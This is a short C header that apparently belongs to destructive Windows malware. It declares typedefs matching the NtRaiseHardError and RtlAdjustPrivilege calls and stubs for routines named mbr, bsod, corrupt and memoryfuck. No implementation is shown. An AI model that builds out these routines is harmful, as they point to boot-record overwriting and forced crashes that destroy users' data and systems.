#pragma once
#include "lipton.h"
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
DWORD memoryfuck();
DWORD corrupt();
DWORD execute();
void mbr();
void bsod();